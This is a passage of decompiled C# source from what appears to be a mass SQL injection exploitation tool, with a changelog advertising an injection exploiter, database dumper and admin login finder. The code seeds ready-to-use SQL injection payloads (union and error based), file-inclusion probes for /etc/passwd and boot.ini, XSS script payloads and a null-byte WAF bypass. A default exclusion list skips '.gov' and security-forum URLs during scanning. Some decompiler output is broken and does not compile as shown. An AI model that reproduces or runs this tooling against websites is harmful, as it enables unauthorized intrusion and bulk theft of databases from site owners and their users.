Redirects)\r\n\r\n08/12/2017 - v.9.3\r\n* Added XXS support\r\n* Added Import URL Injectables.xml from v.8.x\r\n* Added extra 3 column (search rows)\r\n* Added Exploit from .txt (press Start Exploiter with queue empty)\r\n* Added Statistics Virtualization\r\n* Improved exploiter engine\r\n* Improved analyzer engine\r\n  ~40% better detection\r\n  fixed unique filter by domain\r\n  fixed loadfile bug dection\r\n* Improved Dumper for long time dumping (no more slow, only if request delays)\r\n* Improved RAM\\CPU and Traffic use\r\n* Improved multi thread engine stop\r\n* Improved HTTP Debbuger, better delay control\r\n* Improved GUI Core Load\\UnLoad performance\r\n* Improved Skins (added news, removed some)\r\n* Fixed grids auto scroll\r\n* Fixed open new instancie bug on schema\r\n\r\n04/04/2017 - v.9.2\r\n* New: Admin Login Finder\r\n* New: Full translation support\r\n* New: Complete XML Russian language\r\n* Updated: Dumper Form, fixe crash when dump in some cases\r\n* Fixed: MySQL Error Collocations\r\n* Misc: improvements, fixes and optimizations\r\n\r\n03/17/2017 - v.9.1\r\n* Improved: SQL Injection Exploiter\r\n* New: MySQL Load\\Write (bruting path and checking on user_privileges table)\r\n* New: Check Alexa Rank, context menu on Grid (SQLi, File Inclusao)\r\n* Updated: Dumper Form, improvements, fixes and optimizations\r\n* Fixed: Bug on statistic cause crashe after x.x Gb\r\n* Misc: improvements, fixes and optimizations on Main Core\r\n\r\n03/01/2017 - v.9.0\r\n* Initial release";
			IL_629:
			num = 66;
			this.method_93(null, null);
			IL_634:
			goto IL_7A2;
			IL_639:
			int num3 = num4 + 1;
			num4 = 0;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
			IL_759:
			goto IL_797;
			IL_75B:
			num4 = num;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], (num2 > -2) ? num2 : 1);
			IL_774:;
		}
		catch when (endfilter(obj2 is Exception & num2 != 0 & num4 == 0))
		{
			Exception ex = (Exception)obj3;
			goto IL_75B;
		}
		IL_797:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_7A2:
		if (num4 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	// Token: 0x06000EFB RID: 3835 RVA: 0x00066BA8 File Offset: 0x00064DA8
	private void method_74(ToolStripComboBox toolStripComboBox_0)
	{
		System.Text.StringBuilder stringBuilder = new System.Text.StringBuilder();
		checked
		{
			int num = toolStripComboBox_0.Items.Count - 1;
			for (int i = 0; i <= num; i++)
			{
				stringBuilder.Append(toolStripComboBox_0.Items[i].ToString() + "|");
			}
			Class50.smethod_4(base.Name, toolStripComboBox_0.Name, stringBuilder.ToString(), null);
			Class50.smethod_4(base.Name, toolStripComboBox_0.Name + ".Slected", toolStripComboBox_0.Text, null);
		}
	}

	// Token: 0x06000EFC RID: 3836 RVA: 0x00066C34 File Offset: 0x00064E34
	private void method_75(ToolStripComboBox toolStripComboBox_0)
	{
		string text = Class50.smethod_5(base.Name, toolStripComboBox_0.Name, "", null);
		if (!string.IsNullOrEmpty(text))
		{
			foreach (string text2 in text.Split(new char[]
			{
				'|'
			}))
			{
				if (!string.IsNullOrEmpty(text2))
				{
					toolStripComboBox_0.Items.Add(text2);
				}
			}
			toolStripComboBox_0.Text = Class50.smethod_5(base.Name, toolStripComboBox_0.Name + ".Slected", "", null);
		}
	}

	// Token: 0x06000EFD RID: 3837 RVA: 0x00066CCC File Offset: 0x00064ECC
	private void method_76(CheckedListBox checkedListBox_0)
	{
		string text = Class50.smethod_5(base.Name, checkedListBox_0.Name, "", null);
		checked
		{
			if (!string.IsNullOrEmpty(text))
			{
				foreach (string text2 in text.Split(new char[]
				{
					'|'
				}))
				{
					string[] array2 = text2.Split(new char[]
					{
						':'
					});
					if (array2.Length == 2)
					{
						if ((checkedListBox_0 == this.lstAnalizerUnion | checkedListBox_0 == this.lstAnalizerError) && !checkedListBox_0.Items.Contains(array2[0]))
						{
							checkedListBox_0.Items.Add(array2[0]);
						}
						int num = checkedListBox_0.Items.Count - 1;
						for (int j = 0; j <= num; j++)
						{
							if (array2[0].Equals(checkedListBox_0.Items[j].ToString()))
							{
								checkedListBox_0.SetItemChecked(j, Conversions.ToBoolean(array2[1]));
								break;
							}
						}
					}
				}
			}
			else
			{
				int num2 = checkedListBox_0.Items.Count - 1;
				for (int k = 0; k <= num2; k++)
				{
					checkedListBox_0.SetItemChecked(k, true);
				}
			}
		}
	}

	// Token: 0x06000EFE RID: 3838 RVA: 0x00066E00 File Offset: 0x00065000
	private void method_77(CheckedListBox checkedListBox_0)
	{
		System.Text.StringBuilder stringBuilder = new System.Text.StringBuilder();
		checked
		{
			int num = checkedListBox_0.Items.Count - 1;
			for (int i = 0; i <= num; i++)
			{
				stringBuilder.Append(checkedListBox_0.Items[i].ToString() + ":" + checkedListBox_0.GetItemChecked(i).ToString() + "|");
			}
			Class50.smethod_4(base.Name, checkedListBox_0.Name, stringBuilder.ToString(), null);
		}
	}

	// Token: 0x06000EFF RID: 3839 RVA: 0x00066E7C File Offset: 0x0006507C
	private void method_78(ListViewExt listViewExt_0)
	{
		string text;
		if (listViewExt_0 == this.lvwLFIpathLinux)
		{
			text = Class50.smethod_5(base.Name, listViewExt_0.Name, "/etc/passwd#root:/bin/bash|", null);
		}
		else if (listViewExt_0 == this.lvwLFIpathWin)
		{
			text = Class50.smethod_5(base.Name, listViewExt_0.Name, "c:\\\\boot.ini#default=multi(|d:\\\\boot.ini#default=multi(|c://boot.ini#default=multi(|d://boot.ini#default=multi(|", null);
		}
		else if (listViewExt_0 == this.lvwWafs)
		{
			text = Class50.smethod_5(base.Name, listViewExt_0.Name, "#%00", null);
		}
		else if (listViewExt_0 == this.lvwXSS)
		{
			text = Class50.smethod_5(base.Name, listViewExt_0.Name, "\"><script >alert(String.fromCharCode(88,83,83))</script>#XSS|\"><javascript:alert(String.fromCharCode(88,83,83));\">#XSS", null);
		}
		else
		{
			text = Class50.smethod_5(base.Name, listViewExt_0.Name, "", null);
		}
		checked
		{
			if (!string.IsNullOrEmpty(text))
			{
				foreach (string text2 in text.Split(new char[]
				{
					'|'
				}))
				{
					if (!string.IsNullOrEmpty(text2))
					{
						string[] array2 = text2.Split(new char[]
						{
							'#'
						});
						ListViewItem listViewItem = new ListViewItem();
						listViewItem.Text = array2[0];
						int num = array2.Length - 1;
						for (int j = 1; j <= num; j++)
						{
							listViewItem.SubItems.Add(array2[j]);
						}
						listViewExt_0.Items.Add(listViewItem);
					}
				}
			}
		}
	}

	// Token: 0x06000F00 RID: 3840 RVA: 0x00066FD8 File Offset: 0x000651D8
	private void method_79(ListViewExt listViewExt_0)
	{
		System.Text.StringBuilder stringBuilder = new System.Text.StringBuilder();
		checked
		{
			int num = listViewExt_0.Items.Count - 1;
			for (int i = 0; i <= num; i++)
			{
				stringBuilder.Append(listViewExt_0.Items[i].Text);
				int num2 = listViewExt_0.Columns.Count - 1;
				for (int j = 1; j <= num2; j++)
				{
					stringBuilder.Append("#" + listViewExt_0.Items[i].SubItems[j].Text);
				}
				stringBuilder.Append("|");
			}
			Class50.smethod_4(base.Name, listViewExt_0.Name, stringBuilder.ToString(), null);
		}
	}

	// Token: 0x06000F01 RID: 3841 RVA: 0x00067090 File Offset: 0x00065290
	private void method_80(ListBox listBox_0)
	{
		string text;
		if (listBox_0 == this.lstExcludeUrlWords)
		{
			text = Class50.smethod_5(base.Name, listBox_0.Name, "forum|showthread|.viewforum|.viewtopic|injection|dorks|union|hack|.gov", null);
		}
		else
		{
			text = Class50.smethod_5(base.Name, listBox_0.Name, "", null);
		}
		foreach (string text2 in text.Split(new char[]
		{
			'|'
		}))
		{
			if (!string.IsNullOrEmpty(text2) && !listBox_0.Items.Contains(text2))
			{
				listBox_0.Items.Add(text2);
			}
		}
	}

	// Token: 0x06000F02 RID: 3842 RVA: 0x0006712C File Offset: 0x0006532C
	private void method_81(ListBox listBox_0)
	{
		System.Text.StringBuilder stringBuilder = new System.Text.StringBuilder();
		checked
		{
			int num = listBox_0.Items.Count - 1;
			for (int i = 0; i <= num; i++)
			{
				stringBuilder.Append(listBox_0.Items[i].ToString() + "|");
			}
			Class50.smethod_4(base.Name, listBox_0.Name, stringBuilder.ToString(), null);
		}
	}

	// Token: 0x06000F03 RID: 3843 RVA: 0x00067194 File Offset: 0x00065394
	public MemoryStream Descompress(System.IO.Stream stream)
	{
		int num = Convert.ToInt32(stream.Length);
		byte[] array = new byte[checked(num + 1)];
		stream.Read(array, 0, num);
		stream.Flush();
		stream.Close();
		return new MemoryStream(this.Descompress(array));
	}

	// Token: 0x06000F04 RID: 3844 RVA: 0x000671DC File Offset: 0x000653DC
	public byte[] Descompress(byte[] bytData)
	{
		byte[] result;
		using (GZipStream gzipStream = new GZipStream(new MemoryStream(bytData), CompressionMode.Decompress))
		{
			byte[] array = new byte[4096];
			using (MemoryStream memoryStream = new MemoryStream())
			{
				int num;
				do
				{
					num = gzipStream.Read(array, 0, 4096);
					if (num > 0)
					{
						memoryStream.Write(array, 0, num);
					}
				}
				while (num > 0);
				result = memoryStream.ToArray();
			}
		}
		return result;
	}

	// Token: 0x06000F05 RID: 3845 RVA: 0x00067270 File Offset: 0x00065470
	private List<string> method_82(string string_5)
	{
		List<string> list = new List<string>();
		string_5 = string_5.Replace("\n", "");
		string[] array = Regex.Split(string_5, "\r");
		if (array.Length < 10000)
		{
			foreach (string text in array)
			{
				if (!string.IsNullOrEmpty(text) && !list.Contains(text))
				{
					list.Add(text);
				}
			}
		}
		else
		{
			list.AddRange(array);
		}
		return list;
	}

	// Token: 0x06000F06 RID: 3846 RVA: 0x000672F8 File Offset: 0x000654F8
	private string method_83(string string_5)
	{
		string_5 = Regex.Replace(string_5, Environment.NewLine + Environment.NewLine, "");
		string_5 = Regex.Replace(string_5, "\r\n\r\n", "");
		string_5 = Regex.Replace(string_5, "\r\r", "");
		string_5 = Regex.Replace(string_5, "\t", "");
		string_5 = Regex.Replace(string_5, " ", "");
		return string_5;
	}

	// Token: 0x06000F07 RID: 3847 RVA: 0x00067378 File Offset: 0x00065578
	private int method_84(string string_5)
	{
		checked
		{
			int result;
			if (string_5.Length <= 2)
			{
				result = 0;
			}
			else
			{
				int num = string_5.Split(new char[]
				{
					'\r'
				}).Length;
				if (string_5.Substring(string_5.Length - 2, 1).Equals("\r"))
				{
					num--;
				}
				result = num;
			}
			return result;
		}
	}

	// Token: 0x06000F08 RID: 3848 RVA: 0x000673D0 File Offset: 0x000655D0
	internal IPAddress method_85(string string_5)
	{
		IPAddress result;
		try
		{
			IPHostEntry iphostEntry = null;
			try
			{
				iphostEntry = Dns.GetHostEntry(string_5);
			}
			catch (Exception ex)
			{
				if (!string_5.StartsWith("www."))
				{
					iphostEntry = Dns.GetHostEntry("www." + string_5);
				}
			}
			if (iphostEntry != null)
			{
				foreach (IPAddress ipaddress in iphostEntry.AddressList)
				{
					if (ipaddress.AddressFamily == AddressFamily.InterNetwork)
					{
						return ipaddress;
					}
				}
			}
			result = null;
		}
		catch (Exception ex2)
		{
			result = null;
		}
		return result;
	}

	// Token: 0x06000F09 RID: 3849 RVA: 0x00067480 File Offset: 0x00065680
	private int method_86(string string_5)
	{
		checked
		{
			int num;
			using (StreamReader streamReader = new StreamReader(string_5))
			{
				while (!streamReader.EndOfStream)
				{
					streamReader.ReadLine();
					num++;
				}
				streamReader.Close();
			}
			return num;
		}
	}

	// Token: 0x06000F0A RID: 3850 RVA: 0x000674D4 File Offset: 0x000656D4
	private string method_87(string string_5, int int_14 = 10000)
	{
		FileInfo fileInfo = new FileInfo(string_5);
		System.Text.StringBuilder stringBuilder = new System.Text.StringBuilder();
		checked
		{
			using (StreamReader streamReader = fileInfo.OpenText())
			{
				while (!streamReader.EndOfStream)
				{
					string value = streamReader.ReadLine();
					if (string.IsNullOrEmpty(stringBuilder.ToString()))
					{
						stringBuilder.Append(value);
					}
					else
					{
						stringBuilder.AppendLine(value);
					}
					int num;
					num++;
					if (num > int_14)
					{
						break;
					}
				}
				streamReader.Close();
			}
			return stringBuilder.ToString();
		}
	}

	// Token: 0x06000F0B RID: 3851 RVA: 0x00067564 File Offset: 0x00065764
	private void method_88()
	{
		int num;
		int num4;
		object obj;
		try
		{
			IL_02:
			ProjectData.ClearProjectError();
			num = -2;
			IL_0A:
			int num2 = 2;
			string text = new WebClient().DownloadString("http://checkip.dyndns.org/");
			IL_1C:
			num2 = 3;
			text = new Regex("\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}").Matches(text)[0].ToString();
			IL_3A:
			num2 = 4;
			string text2 = "";
			IL_42:
			num2 = 5;
			Image image = null;
			IL_47:
			num2 = 6;
			if (string.IsNullOrEmpty(text))
			{
				goto IL_BB;
			}
			IL_54:
			num2 = 7;
			string text3;
			global::Globals.G_DataGP.Lookup(text, ref text2, ref image, ref text3, true);
			IL_68:
			num2 = 8;
			if (!text3.Equals("--"))
			{
				goto IL_89;
			}
			IL_78:
			num2 = 9;
			this.lblIP.Text = text;
			goto IL_DD;
			IL_89:
			num2 = 11;
			this.lblIP.Image = image;
			IL_99:
			num2 = 12;
			this.lblIP.Text = "[" + text3 + "] " + text;
			goto IL_DD;
			IL_BB:
			num2 = 15;
			this.lblIP.Image = null;
			IL_CA:
			num2 = 16;
			this.lblIP.Text = "";
			IL_DD:
			goto IL_183;
			IL_E2:
			int num3 = num4 + 1;
			num4 = 0;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
			IL_13A:
			goto IL_178;
			IL_13C:
			num4 = num2;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], (num > -2) ? num : 1);
			IL_155:;
		}
		catch when (endfilter(obj is Exception & num != 0 & num4 == 0))
		{
			Exception ex = (Exception)obj2;
			goto IL_13C;
		}
		IL_178:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_183:
		if (num4 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	// Token: 0x06000F0C RID: 3852 RVA: 0x00008378 File Offset: 0x00006578
	private void method_89(object sender, EventArgs e)
	{
		this.method_88();
	}

	// Token: 0x06000F0D RID: 3853 RVA: 0x00008380 File Offset: 0x00006580
	private void method_90(object sender, EventArgs e)
	{
		this.grbDorks.Visible = !this.chkHideDork.Checked;
	}

	// Token: 0x06000F0E RID: 3854 RVA: 0x0000839B File Offset: 0x0000659B
	private void method_91(object sender, EventArgs e)
	{
		this.txtUserAgent.Text = this.txtUserAgent.Text.Trim();
		if (string.IsNullOrEmpty(this.txtUserAgent.Text))
		{
			this.txtUserAgent.Text = "Mozilla/ 5.0(Windows NT 10.0; WOW64; rv: 50.0) Gecko/20100101 Firefox/50.0";
		}
	}

	// Token: 0x06000F0F RID: 3855 RVA: 0x000083DA File Offset: 0x000065DA
	private void method_92(object sender, EventArgs e)
	{
		this.txtAccept.Text = this.txtAccept.Text.Trim();
		if (string.IsNullOrEmpty(this.txtAccept.Text))
		{
			this.txtAccept.Text = "text/html,application/xhtml xml,application/xml;q=0.9,*/*;q=0.8";
		}
	}

	// Token: 0x06000F10 RID: 3856 RVA: 0x0006771C File Offset: 0x0006591C
	private void method_93(object sender, EventArgs e)
	{
		if (sender != null)
		{
			NewLateBinding.LateSet(sender, null, "SelectedItem", new object[1], null, null);
		}
		checked
		{
			if (this.lstAnalizerUnion.Items.Count == 0)
			{
				string[] array = new string[]
				{
					"' union all select [t] and '1'='1",
					"999999.9 union all select [t]",
					"999999.9 union all select [t]--",
					" and 1'='1' union all select [t] and '1'='1",
					" or 1'='1' union all select [t] and '1'='1",
					"999999.9' union all select [t] and '1'='1",
					"999999.9) union all select [t] and (1=1",
					"999999.9) union all select [t] and (1=1",
					" and 1=1 union all select [t]",
					" or 1=1 union all select [t]"
				};
				int num = array.Length - 1;
				for (int i = 0; i <= num; i++)
				{
					this.lstAnalizerUnion.Items.Add(array[i], i < 6);
				}
			}
			if (this.lstAnalizerError.Items.Count == 0)
			{
				string[] array2 = new string[]
				{
					"' and [t] and '1'='1",
					"' or [t] and '1'='1",
					"[t]",
					" and 1=[t] and 1=1",
					" or 1=[t] and 1=1",
					"' and 1=[t] and '1'='1",
					"' or 1=[t] and '1'='1",
					"' and [t] and '1'='1",
					"' or [t] and '1'='1",
					"[t]--",
					" and 1=[t] and 1=1--"
				};
				int num2 = array2.Length - 1;
				for (int j = 0; j <= num2; j++)
				{
					this.lstAnalizerError.Items.Add(array2[j], j < 9);
				}
			}
		}
	}

	// Token: 0x06000F11 RID: 3857 RVA: 0x00008419 File Offset: 0x00006619
	private void method_94(object sender, EventArgs e)
	{
		if (string.IsNullOrEmpty(this.txtAnalizerExploitCode.Text))
		{
			this.txtAnalizerExploitCode.Text = "'[0]";
		}
	}

	// Token: 0x06000F12 RID: 3858 RVA: 0x0006788C File Offset: 0x00065A8C
	private void method_95(object sender, EventArgs e)
	{
		this.numAnalizerUnionEnd.Minimum = decimal.Add(this.numAnalizerUnionSart.Value, 1m);
		this.numAnalizerUnionSart.Maximum = decimal.Subtract(this.numAnalizerUnionEnd.Value, 1m);
	}

	// Token: 0x06000F13 RID: 3859 RVA: 0x0000843D File Offset: 0x0000663D
	private void method_96(object sender, EventArgs e)
	{
		global::Globals.G_SOCKS.UseMyIP = this.btnSocksMyIP.Checked;
	}

	// Token: 0x06000F14 RID: 3860 RVA: 0x000678DC File Offset: 0x00065ADC
	private void method_97(object sender, EventArgs e)
	{
		if (this.numThreads.Tag != null)
		{
			if (this.bool_3)
			{
				if (this.mdiTabControl != null)
				{
					if (this.uxTabControl_0.SelectedIndex == 0)
					{
						this.int_3 = Convert.ToInt32(this.numThreads.Value);
					}
					else if (this.uxTabControl_0.SelectedIndex == 1 | this.uxTabControl_0.SelectedIndex == 2)
					{
						this.int_2 = Convert.ToInt32(this.numThreads.Value);
					}
					if (this.threadPool_0 != null)
					{
						this.threadPool_0.MaxThreadCount = Convert.ToInt32(this.numThreads.Value);
					}
				}
			}
			else if (this.twMain.SelectedNode != null)
			{
				if (this.twMain.SelectedNode == this.treeNode_0)
				{
					this.int_3 = Convert.ToInt32(this.numThreads.Value);
				}
				else if (this.twMain.SelectedNode == this.treeNode_4 | this.twMain.SelectedNode == this.treeNode_1)
				{
					this.int_2 = Convert.ToInt32(this.numThreads.Value);
				}
				if (this.threadPool_0 != null)
				{
					this.threadPool_0.MaxThreadCount = Convert.ToInt32(this.numThreads.Value);
				}
			}
		}
	}

	// Token: 0x06000F15 RID: 3861 RVA: 0x00008454 File Offset: 0x00006654
	private void method_98(object sender, EventArgs e)
	{
		if (this.enum6_0 == MainForm.Enum6.const_4 && this.threadPool_0 != null)
		{
			this.threadPool_0.MaxThreadCount = Convert.ToInt32(this.numSearchColumnThreads.Value);
		}
	}

	// Token: 0x06000F16 RID: 3862 RVA: 0x00008487 File Offset: 0x00006687
	private void method_99(object sender, CancelEventArgs e)
	{
		e.Cancel = (this.lvwScannerDomain.SelectedItems.Count != 1 | this.enum6_0 == MainForm.Enum6.const_1);
	}

	// Token: 0x06000F17 RID: 3863 RVA: 0x00067A48 File Offset: 0x00065C48
	private void method_100(object sender, EventArgs e)
	{
		ListViewItem listViewItem = this.lvwScannerDomain.SelectedItems[0];
		using (ImpBox impBox = new ImpBox())
		{
			impBox.MinLengh = 2;
			impBox.txtValue.MaxLength = 3;
			impBox.txtValue.CharacterCasing = CharacterCasing.Lower;
			impBox.Text = global::Globals.translate_0.GetStr(this, 71, "") + listViewItem.Text;
			impBox.txtValue.Text = listViewItem.SubItems[1].Text;
			if (impBox.ShowDialog(this) == DialogResult.OK)
			{
				listViewItem.SubItems[1].Text = impBox.txtValue.Text;
			}
		}
	}

	// Token: 0x06000F18 RID: 3864 RVA: 0x000084AF File Offset: 0x000066AF
	private void method_101(object sender, EventArgs e)
	{
		this.cmbUpdater.Enabled = this.chkUpdater.Checked;
	}

	// Token: 0x06000F19 RID: 3865 RVA: 0x00067B14 File Offset: 0x00065D14
	private void method_102(object sender, EventArgs e)
	{
		if (Operators.CompareString(this.btnXmlImport8x.Text, "Cancel", false) == 0)
		{
			this.bckImport.CancelAsync();
			this.btnXmlImport8x.Enabled = false;
		}
		else
		{
			using (OpenFileDialog openFileDialog = new OpenFileDialog())
			{
				openFileDialog.Multiselect = false;
				openFileDialog.Filter = "XML File|*.xml";
				openFileDialog.Title = "Open 'URL Injectables.xml'";
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					this.btnXmlImport8x.Text = "Cancel";
					this.prbImport.Value = 0;
					this.bckImport.RunWorkerAsync(openFileDialog.FileName);
				}
			}
		}
	}

	// Token: 0x06000F1A RID: 3866 RVA: 0x00067BCC File Offset: 0x00065DCC
	private void method_103(object sender, DoWorkEventArgs e)
	{
		checked
		{
			try
			{
				string fileName = Conversions.ToString(e.Argument);
				int num = 0;
				List<Class29.Class30> list = new List<Class29.Class30>();
				DataTable dataTable = new DataTable("Item");
				dataTable.BeginLoadData();
				int num2 = 0;
				do
				{
					DataColumn dataColumn = new DataColumn();
					dataColumn.DataType = typeof(string);
					dataColumn.ColumnName = "C" + (num2 + 1).ToString().PadLeft(2, '0');
					dataTable.Columns.Add(dataColumn);
					if (num2 == 0)
					{
						dataTable.PrimaryKey = new DataColumn[]
						{
							dataColumn
						};
					}
					num2++;
				}
				while (num2 <= 9);
				dataTable.ReadXml(fileName);
				int num3 = dataTable.Rows.Count - 1;
				for (int i = 0; i <= num3; i++)
				{
					DataRow dataRow = dataTable.Rows[i];
					string text = Conversions.ToString(dataRow[0]);
					string text2 = Conversions.ToString(dataRow[1]);
					string text3 = Conversions.ToString(dataRow[3]);
					string text4 = Conversions.ToString(dataRow[2]);
					string text5 = Conversions.ToString(dataRow[9]);
					string text6 = Conversions.ToString(dataRow[7]);
					Class29.Class30 @class = new Class29.Class30(this.dtgSQLi);
					@class.CountryIndex = 4;
					@class.Items = new string[]
					{
						text,
						text2,
						text3,
						text4,
						text6,
						"",
						text5
					};
					if (!global::Globals.DG_SQLi.method_10(text))
					{
						num++;
						list.Add(@class);
					}
					int num4 = (int)Math.Round(Math.Round((double)(100 * (i + 1)) / (double)dataTable.Rows.Count));
					this.method_1(string.Concat(new string[]
					{
						"[",
						global::Globals.FormatNumbers(i + 1, true),
						" | ",
						global::Globals.FormatNumbers(dataTable.Rows.Count, true),
						"] ",
						Conversions.ToString(num4),
						"% Importing please wait.."
					}));
					this.bckImport.ReportProgress(num4);
					if (this.bckImport.CancellationPending)
					{
						break;
					}
					Application.DoEvents();
				}
				dataTable.EndLoadData();
				dataTable.Dispose();
				if (num > 0)
				{
					this.method_1("Adding to grid " + global::Globals.FormatNumbers(num, true));
					global::Globals.DG_SQLi.method_17(list);
					this.method_1("Imported " + global::Globals.FormatNumbers(num, true) + " injectables..");
				}
			}
			catch (Exception ex)
			{
				this.method_1("Import Error " + ex.Message);
			}
		}
	}

	// Token: 0x06000F1B RID: 3867 RVA: 0x000084C7 File Offset: 0x000066C7
	private void method_104(object sender, ProgressChangedEventArgs e)
	{
		this.prbImport.Value = e.ProgressPercentage;
	}

	// Token: 0x06000F1C RID: 3868 RVA: 0x000084DA File Offset: 0x000066DA
	private void method_105(object sender, RunWorkerCompletedEventArgs e)
	{
		this.prbImport.Value = 0;
		this.prbImport.Enabled = false;
		this.btnXmlImport8x.Enabled = true;
		this.btnXmlImport8x.Text = "Import";
		global::Globals.ReleaseMemory();
	}

	// Token: 0x06000F1D RID: 3869 RVA: 0x00008515 File Offset: 0x00006715
	private void method_106(object sender, TreeViewCancelEventArgs e)
	{
		e.Cancel = !this.bool_2;
	}

	// Token: 0x06000F1E RID: 3870 RVA: 0x00008526 File Offset: 0x00006726
	private void method_107(object sender, ItemCheckEventArgs e)
	{
		if (this.enum6_0 == MainForm.Enum6.const_1)
		{
			e.NewValue = e.CurrentValue;
		}
	}

	// Token: 0x06000F1F RID: 3871 RVA: 0x00067EAC File Offset: 0x000660AC
	private void method_108(object sender, EventArgs e)
	{
		int num2;
		int num4;
		object obj;
		try
		{
			IL_02:
			int num = 1;
			if (!this.bool_2)
			{
				goto IL_66;
			}
			IL_0C:
			ProjectData.ClearProjectError();
			num2 = -2;
			IL_14:
			num = 3;
			string language = global::Globals.translate_0.GetLanguage();
			IL_21:
			num = 4;
			if (language.Equals(this.cmbLanguages.Text))
			{
				goto IL_66;
			}
			IL_39:
			num = 5;
			using (new Class8(this))
			{
				if (MessageBox.Show("To change the language, you must restart the application.\r\nДля изменения языка необходимо перезапустить приложение.", this.Text, MessageBoxButtons.OK, MessageBoxIcon.Question) != DialogResult.OK)
				{
				}
			}
			IL_66:
			goto IL_E1;
			IL_68:
			int num3 = num4 + 1;
			num4 = 0;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
			IL_98:
			goto IL_D6;
			IL_9A:
			num4 = num;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], (num2 > -2) ? num2 : 1);
			IL_B3:;
		}
		catch when (endfilter(obj is Exception & num2 != 0 & num4 == 0))
		{
			Exception ex = (Exception)obj2;
			goto IL_9A;
		}
		IL_D6:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_E1:
		if (num4 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	// Token: 0x06000F20 RID: 3872 RVA: 0x00067FC0 File Offset: 0x000661C0
	private void method_109(object sender, EventArgs e)
	{
		int num2;
		int num4;
		object obj;
		try
		{
			IL_02:
			int num = 1;
			if (!this.bool_2)
			{
				goto IL_78;
			}
			IL_0C:
			ProjectData.ClearProjectError();
			num2 = -2;
			IL_14:
			num = 3;
			string text = Class50.smethod_5(base.Name, this.cmbGuiStyle.Name, "Tree View", null);
			IL_33:
			num = 4;
			if (text.Equals(this.cmbGuiStyle.Text))
			{
				goto IL_78;
			}
			IL_4B:
			num = 5;
			using (new Class8(this))
			{
				if (MessageBox.Show("To change the Gui Style, you must restart the application.\r\nДля изменения внешний вид необходимо перезапустить приложение.", this.Text, MessageBoxButtons.OK, MessageBoxIcon.Question) != DialogResult.OK)
				{
				}
			}
			IL_78:
			goto IL_F3;
			IL_7A:
			int num3 = num4 + 1;
			num4 = 0;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
			IL_AA:
			goto IL_E8;
			IL_AC:
			num4 = num;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], (num2 > -2) ? num2 : 1);
			IL_C5:;
		}
		catch when (endfilter(obj is Exception & num2 != 0 & num4 == 0))
		{
			Exception ex = (Exception)obj2;
			goto IL_AC;
		}
		IL_E8:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_F3:
		if (num4 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	// Token: 0x06000F21 RID: 3873 RVA: 0x000680E8 File Offset: 0x000662E8
	private void method_110(object sender, EventArgs e)
	{
		TextBox textBox = (TextBox)sender;
		if (textBox.Text.StartsWith(" ") | textBox.Text.EndsWith(" "))
		{
			textBox.Text = textBox.Text.Trim();
		}
	}

	// Token: 0x06000F22 RID: 3874 RVA: 0x0000853F File Offset: 0x0000673F
	private void method_111(object sender, EventArgs e)
	{
		this.tpLfiWin.Enabled = !this.chkLfiWindowsSkip.Checked;
	}

	// Token: 0x06000F23 RID: 3875 RVA: 0x0000855A File Offset: 0x0000675A
	private void method_112(object sender, ItemCheckEventArgs e)
	{
		if (this.enum6_0 == MainForm.Enum6.const_2 | this.enum6_0 == MainForm.Enum6.const_3)
		{
			e.NewValue = e.CurrentValue;
		}
	}

	// Token: 0x06000F24 RID: 3876 RVA: 0x00068130 File Offset: 0x00066330
	private void method_113(object sender, EventArgs e)
	{
		checked
		{
			int num = this.lstExpoitType.Items.Count - 1;
			int num2 = 0;
			bool itemChecked;
			while (num2 <= num && !(itemChecked = this.lstExpoitType.GetItemChecked(num2)))
			{
				num2++;
			}
			if (!itemChecked)
			{
				this.lstExpoitType.SetItemChecked(0, true);
			}
			this.lstExpoitType.SelectedItem = null;
		}
	}

	// Token: 0x06000F25 RID: 3877 RVA: 0x0000857D File Offset: 0x0000677D
	private void method_114(object sender, EventArgs e)
	{
		NewLateBinding.LateSet(sender, null, "SelectedItem", new object[1], null, null);
	}

	// Token: 0x06000F26 RID: 3878 RVA: 0x0006818C File Offset: 0x0006638C
	private void method_115(object sender, EventArgs e)
	{
		if (this.txtExcludeUrlWords.Text.Contains(" "))
		{
			this.txtExcludeUrlWords.Text = this.txtExcludeUrlWords.Text.Replace(" ", "");
		}
		this.btnExcludeUrlWords.Enabled = !string.IsNullOrEmpty(this.txtExcludeUrlWords.Text);
	}

	// Token: 0x06000F27 RID: 3879 RVA: 0x000681F4 File Offset: 0x000663F4
	private void method_116(object sender, EventArgs e)
	{
		if (sender == this.btnExcludeUrlWords)
		{
			TextBox txtExcludeUrlWords = this.txtExcludeUrlWords;
			ListBox lstExcludeUrlWords = this.lstExcludeUrlWords;
			if (!string.IsNullOrEmpty(txtExcludeUrlWords.Text) && !lstExcludeUrlWords.Items.Contains(txtExcludeUrlWords.Text))
			{
				txtExcludeUrlWords.Focus();
				lstExcludeUrlWords.Items.Add(txtExcludeUrlWords.Text);
				lstExcludeUrlWords.TopIndex = checked(lstExcludeUrlWords.Items.Count - 1);
			}
			txtExcludeUrlWords.Text = "";
		}
	}

	// Token: 0x06000F28 RID: 3880 RVA: 0x00068278 File Offset: 0x00066478
	private void method_117(object sender, EventArgs e)
	{
		if (this.mnuExcludeUrlWords.SourceControl == this.lstExcludeUrlWords)
		{
			ListBox lstExcludeUrlWords = this.lstExcludeUrlWords;
			while (lstExcludeUrlWords.SelectedItems.Count > 0)
			{
				lstExcludeUrlWords.Items.Remove(RuntimeHelpers.GetObjectValue(lstExcludeUrlWords.SelectedItems[0]));
			}
		}
	}

